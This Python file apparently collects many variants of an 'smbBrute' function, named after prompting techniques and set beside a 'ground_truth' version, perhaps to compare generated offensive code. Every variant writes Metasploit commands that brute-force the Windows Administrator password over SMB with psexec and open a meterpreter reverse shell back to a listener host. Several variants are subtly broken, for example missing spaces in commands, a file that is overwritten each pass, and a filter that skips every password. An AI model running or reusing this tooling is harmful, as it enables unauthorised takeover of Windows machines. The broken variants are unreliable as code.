import logging
import os
import pathlib

def ground_truth_code_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

def persona_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as passwdFilePtr, open(configFile, 'w') as configFilePtr:
            for password in passwdFilePtr:
                password = password.rstrip('\n').rstrip('\r')
                configFilePtr.write('use exploit/windows/smb/psexec\n')
                configFilePtr.write('set SMBUser Administrator\n')
                configFilePtr.write('set SMBPass'+ str(password) + '\n')
                configFilePtr.write('set RHOST'+ str(tgtHost) + '\n')
                configFilePtr.write('set payload windows/meterpreter/reverse_tcp\n')
                configFilePtr.write('set LPORT'+ str(lport) + '\n')
                configFilePtr.write('set LHOST'+ str(lhost) + '\n')
                configFilePtr.write('exploit -j -z\n')
        configFilePtr.close()
        passwdFilePtr.close()
    except FileNotFoundError:
        raise('The passwdFile was not found.\n')
    except Exception as e:
        raise('An error occurred:'+ str(e))
        
def template_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	try:
		with open(passwdFile, 'r') as f:
			passwords = [line.strip('\r\n') for line in f.readlines()]
		f.close()
		with open(configFile, 'w') as cf:
			for password in passwords:
				cf.write('use exploit/windows/smb/psexec\n')
				cf.write('set SMBUser Administrator\n')
				cf.write('set SMBPass'+ str(password) + '\n')
				cf.write('set RHOST'+ str(tgtHost) + '\n')
				cf.write('set payload windows/meterpreter/reverse_tcp\n')
				cf.write('set LPORT'+ str(lport) + '\n')
				cf.write('set LHOST'+ str(lhost) + '\n')
				cf.write('exploit -j -z\n\n')
		cf.close()
	except FileNotFoundError as e:
		raise(f'File not found: {e}')
	except Exception as e:
		raise(f'An error occurred: {e}')
              
def question_refinement_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    configFile = configFile.strip()
    tgtHost = tgtHost.strip()
    passwdFile = passwdFile.strip()
    lhost = lhost.strip()
    lport = lport.strip()
    
    if not configFile or not tgtHost or not passwdFile or not lhost or not lport:
        return {'error': 'Invalid input'}
    
    if not configFile.endswith('.config') or not passwdFile.endswith('.txt'):
        return {'error': 'Invalid file extension'}
    
    if not lport.isdigit() or len(lport) > 5:
        return {'error': 'Invalid port number'}
    
    try:
        with open(passwdFile, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        return {'error': 'Password file not found'}
    
    try:
        with open(configFile, 'w') as file:
            for password in passwords:
                password = password.strip()
                if password:
                    metasploit_config = f"""use exploit/multi/http/apache_tomcat_upload
set PASS {password}
set RHOSTS {tgtHost}
set LHOST {lhost}
set LPORT {lport}
exploit"""
                    file.write(metasploit_config + '\n')
    except Exception as e:
        return {'error': str(e)}
    
    return {'success': 'Metasploit config generated'}


def alternative_approaches_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not isinstance(configFile, str) or not isinstance(tgtHost, str) or not isinstance(passwdFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
        raise TypeError("All parameters except for lport must be of type string, while lport should be a non-negative integer.")
    if lport < 0:
        raise TypeError("lport should be a non-negative integer.")
    try:
        with open(configFile, 'w') as cFile, open(passwdFile, 'r') as pFile:
            for password in pFile:
                password = password.rstrip('\n\r')
                cFile.write('use exploit/windows/smb/psexec\n')
                cFile.write('set SMBUser Administrator\n')
                cFile.write('set SMBPass'+ str(password) + '\n')
                cFile.write('set RHOST'+ str(tgtHost) + '\n')
                cFile.write('set payload windows/meterpreter/reverse_tcp\n')
                cFile.write('set LPORT'+ str(lport) + '\n')
                cFile.write('set LHOST'+ lhost + '\n')
                cFile.write('exploit -j -z\n')
    except FileNotFoundError:
        raise(f"One of {configFile} or {passwdFile} was not found. Please provide a valid file path.")
    except PermissionError:
        raise(f"Missing permissions to access either {configFile} or {passwdFile}. Ensure the process has the necessary file system permissions.")
    except Exception as e:
        raise(f"An error occurred: {e}")
        
def context_manager_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as passwords, open(configFile, 'w') as config:
        for password in passwords:
            password = password.strip('\n\r')
            config.write('use exploit/windows/smb/psexec\n')
            config.write('set SMBUser Administrator\n')
            config.write('set SMBPass'+ password + '\n')
            config.write('set RHOST'+ str(tgtHost) + '\n')
            config.write('set payload windows/meterpreter/reverse_tcp\n')
            config.write('set LPORT'+ str(lport) + '\n')
            config.write('set LHOST'+ str(lhost) + '\n')
            config.write('exploit -j -z\n')
            config.write('\n')
            
def flipped_interaction_3__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	with open(passwdFile, 'r') as password_file:
		passwords = [line.strip() for line in password_file.readlines()]
	for password in passwords:
		with open(configFile, 'w') as config:
			config.write('use exploit/windows/smb/psexec\n')
			config.write('set SMBUser Administrator\n')
			config.write(f'set SMBPass {password}\n')
			config.write(f'set RHOST {tgtHost}\n')
			config.write('set payload windows/meterpreter/reverse_tcp\n')
			config.write(f'set LPORT {lport}\n')
			config.write(f'set LHOST {lhost}\n')
			config.write('exploit -j -z\n')
               
def flipped_interaction_4__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not isinstance(tgtHost, str) or not tgtHost.strip():
        raise ValueError("tgtHost must be a non-empty string")
    if not isinstance(lhost, str) or not lhost.strip():
        raise ValueError("lhost must be a non-empty string")
    if not isinstance(lport, int) or not 1 <= lport <= 65535:
        raise ValueError("lport must be a valid port number")
    
    attempts = 0
    try:
        with open(passwdFile, 'r') as file:
            with open(configFile, 'a') as config:
                for line in file:
                    password = line.strip()
                    if not password or password.startswith(''):
                        continue
                    config.write('use exploit/windows/smb/psexec\n')
                    config.write('set SMBUser Administrator\n')
                    config.write(f'set SMBPass {password}\n')
                    config.write(f'set RHOST {tgtHost}\n')
                    config.write('set payload windows/meterpreter/reverse_tcp\n')
                    config.write(f'set LPORT {lport}\n')
                    config.write(f'set LHOST {lhost}\n')
                    config.write('exploit -j -z\n\n')
                    attempts += 1
    except Exception as e:
        raise Exception(f'An error occurred: {str(e)}')
    
    return attempts

    
def flipped_interaction_5__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not isinstance(tgtHost, str) or not tgtHost.strip():
        raise ValueError("tgtHost must be a non-empty string")
    if not isinstance(lhost, str) or not lhost.strip():
        raise ValueError("lhost must be a non-empty string")
    if not isinstance(lport, int) or lport < 0 or lport > 65535:
        raise ValueError("lport must be a valid integer between 0 and 65535")
    try:
        with open(passwdFile, 'r') as passwd_file:
            for line in passwd_file:
                password = line.strip('\r\n')
                with open(configFile, 'a') as config_file:
                    config_file.write('use exploit/windows/smb/psexec\n')
                    config_file.write('set SMBUser Administrator\n')
                    config_file.write(f'set SMBPass {password}\n')
                    config_file.write(f'set RHOST {tgtHost}\n')
                    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
                    config_file.write(f'set LPORT {lport}\n')
                    config_file.write(f'set LHOST {lhost}\n')
                    config_file.write('exploit -j -z\n')
                    config_file.write('\n')
    except FileNotFoundError as e:
        raise(f"File not found: {e}")
    except PermissionError as e:
        raise(f"Permission denied: {e}")
    except Exception as e:
        raise(f"An error occurred: {e}")
        
def iterative_prompting_3__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not isinstance(configFile, str) or not isinstance(tgtHost, str) or not isinstance(passwdFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
        raise TypeError('Invalid input type')
    try:
        with open(passwdFile, 'r', encoding='utf-8', errors='ignore') as passwords:
            if passwords is None:
                raise FileNotFoundError('Password file not found')
            lines = []
            for password in passwords:
                password = password.strip()
                if not password:
                    continue
                lines.append('use exploit/windows/smb/psexec\n')
                lines.append('set SMBUser Administrator\n')
                lines.append('set SMBPass '+ str(password) + '\n')
                lines.append('set RHOST '+ str(tgtHost) + '\n')
                lines.append('set payload windows/meterpreter/reverse_tcp\n')
                lines.append('set LPORT '+ str(lport) + '\n')
                lines.append('set LHOST '+ lhost + '\n')
                lines.append('exploit -j -z\n')
        with open(configFile, 'w', encoding='utf-8') as configFileHandler:
            configFileHandler.writelines(lines)
    except FileNotFoundError as e:
        raise(f'Error: {e}')
    except Exception as e:
        raise(f'An error occurred: {e}')
        
def iterative_prompting_4__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	if not all([isinstance(i, str) for i in [configFile, tgtHost, passwdFile, lhost]] + [isinstance(lport, int)]):
		raise TypeError('Invalid input types. All inputs except lport must be strings, lport must be an integer.')
	try:
		with open(passwdFile, 'r', encoding='utf-8', errors='ignore') as passwords:
			for password in passwords:
				password = password.strip('\n').strip('\r')
				if not password:
					continue
				try:
					with open(configFile, 'w', encoding='utf-8', errors='ignore') as config:
						config.write('use exploit/windows/smb/psexec\n')
						config.write('set SMBUser Administrator\n')
						config.write('set SMBPass '+ str(password) + '\n')
						config.write('set RHOST '+ str(tgtHost) + '\n')
						config.write('set payload windows/meterpreter/reverse_tcp\n')
						config.write('set LPORT '+ str(lport) + '\n')
						config.write('set LHOST '+ lhost + '\n')
						config.write('exploit -j -z\n')
				except Exception as e:
					raise(f"Failed to write to config file: {e}")
	except Exception as e:
		raise(f"Failed to read password file: {e}")
            
def iterative_prompting_5__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	if not isinstance(configFile, str) or not isinstance(tgtHost, str) or not isinstance(passwdFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
		raise TypeError('Invalid input type')
	if '<' in configFile or '>' in configFile or ';' in configFile or r'\x00' in configFile:
		raise Exception('Invalid character in configFile')
	if '<' in tgtHost or '>' in tgtHost or ';' in tgtHost or r'\x00' in tgtHost:
		raise Exception('Invalid character in tgtHost')
	if '<' in passwdFile or '>' in passwdFile or ';' in passwdFile or r'\x00' in passwdFile:
		raise Exception('Invalid character in passwdFile')
	if '<' in lhost or '>' in lhost or ';' in lhost or r'\x00' in lhost:
		raise Exception('Invalid character in lhost')
	if not pathlib.Path(passwdFile).is_file():
		raise FileNotFoundError('File not found')
	if not os.access(passwdFile, os.R_OK):
		raise PermissionError('Permission denied')
	if lport < 1 or lport > 65535:
		raise Exception('Invalid port number')
	try:
		with open(passwdFile, 'r') as passwords, open(configFile, 'w+') as file:
			for password in passwords:
				password = password.rstrip('\n').rstrip('\r')
				if len(password) == 0:
					continue
				file.write('use exploit/windows/smb/psexec\n')
				file.write('set SMBUser Administrator\n')
				file.write('set SMBPass'+ str(password) + '\n')
				file.write('set RHOST'+ str(tgtHost) + '\n')
				file.write('set payload windows/meterpreter/reverse_tcp\n')
				file.write('set LPORT'+ str(lport) + '\n')
				file.write('set LHOST'+ lhost + '\n')
				file.write('exploit -j -z\n')
	except Exception as e:
		raise Exception('An error occurred:'+ str(e))
      
def few_shots_prompting_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	with open(passwdFile, 'r') as f:
		for password in f.readlines():
			with open(configFile, 'a') as c:
				c.write('use exploit/windows/smb/psexec\n')
				c.write('set SMBUser Administrator\n')
				c.write('set SMBPass'+ str(password.strip('\r\n')) + '\n')
				c.write('set RHOST'+ str(tgtHost) + '\n')
				c.write('set payload windows/meterpreter/reverse_tcp\n')
				c.write('set LPORT'+ str(lport) + '\n')
				c.write('set LHOST'+ str(lhost) + '\n')
				c.write('exploit -j -z\n')
                        
def cot_prompting_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	with open(passwdFile, 'r') as f:
		passwords = f.readlines()
	with open(configFile, 'w') as f:
		for password in passwords:
			password = password.replace('\n', '').replace('\r', '')
			f.write('use exploit/windows/smb/psexec\n')
			f.write('set SMBUser Administrator\n')
			f.write('set SMBPass'+ str(password) + '\n')
			f.write('set RHOST'+ str(tgtHost) + '\n')
			f.write('set payload windows/meterpreter/reverse_tcp\n')
			f.write('set LPORT'+ str(lport) + '\n')
			f.write('set LHOST'+ lhost + '\n')
			f.write('exploit -j -z\n')
			f.write('\n')
                  
def fact_check_list_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as passwdFH:
            for password in passwdFH:
                password = password.rstrip('\n\r')
                with open(configFile, 'a') as configFH:
                    configFH.write('use exploit/windows/smb/psexec\n')
                    configFH.write('set SMBUser Administrator\n')
                    configFH.write('set SMBPass {}\n'.format(password))
                    configFH.write('set RHOST {}\n'.format(tgtHost))
                    configFH.write('set payload windows/meterpreter/reverse_tcp\n')
                    configFH.write('set LPORT {}\n'.format(lport))
                    configFH.write('set LHOST {}\n'.format(lhost))
                    configFH.write('exploit -j -z\n')
    except FileNotFoundError:
        raise('The configuration file or password file was not found.')
    except PermissionError:
        raise('Permission denied when trying to read or write a file.')
    except Exception as e:
        raise('An error occurred: {}'.format(str(e)))
        
def not_interactive_mix_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	if not all([configFile, tgtHost, passwdFile, lhost, lport]):
		raise ValueError("All parameters must be provided")
	if not os.path.isfile(passwdFile):
		raise FileNotFoundError("Password file not found")
	try:
		with open(configFile, "w") as config:
			with open(passwdFile, "r") as passwords:
				for password in passwords:
					password = password.strip("\n\r")
					if password:
						config.write(f"use exploit/windows/smb/psexec\n")
					config.write(f"set SMBUser Administrator\n")
					config.write(f"set SMBPass {password}\n")
					config.write(f"set RHOST {tgtHost}\n")
					config.write(f"set payload windows/meterpreter/reverse_tcp\n")
					config.write(f"set LPORT {lport}\n")
					config.write(f"set LHOST {lhost}\n")
					config.write("exploit -j -z\n")
					config.write("\n")
	except Exception as e:
		raise Exception(f"Failed to write to the config file: {e}")
      
import ipaddress
def interactive_mix_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as f:
            passwords = [password.strip('\n\r') for password in f.readlines()]
    except FileNotFoundError:
        raise Exception(f"Password file '{passwdFile}' not found")
    except Exception as e:
        raise Exception(f"Failed to read password file: {e}")
    try:
        ipaddress.ip_address(tgtHost)
    except ValueError:
        raise Exception(f"Invalid target host IP address: '{tgtHost}'")
    try:
        int_lport = int(lport)
        if not 0 <= int_lport <= 65535:
            raise ValueError
    except ValueError:
        raise Exception(f"Invalid listen port: '{lport}'")
    try:
        with open(configFile, 'w') as f:
            for password in passwords:
                f.write("use exploit/windows/smb/psexec\n")
                f.write("set SMBUser Administrator\n")
                f.write(f"set SMBPass {password}\n")
                f.write(f"set RHOST {tgtHost}\n")
                f.write("set payload windows/meterpreter/reverse_tcp\n")
                f.write(f"set LPORT {lport}\n")
                f.write(f"set LHOST {lhost}\n")
                f.write("exploit -j -z\n\n")
    except Exception as e:
        raise Exception(f"Failed to write to configuration file: {e}")
    
def baseline_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(configFile, 'w') as file, open(passwdFile, 'r') as passwords:
        for password in passwords:
            password = password.replace('\n', '').replace('\r', '')
            file.write('use exploit/windows/smb/psexec\n')
            file.write('set SMBUser Administrator\n')
            file.write('set SMBPass'+ str(password) + '\n')
            file.write('set RHOST'+ str(tgtHost) + '\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT'+ str(lport) + '\n')
            file.write('set LHOST'+ lhost + '\n')
            file.write('exploit -j -z\n')
        file.write('exploit -j -z\n')
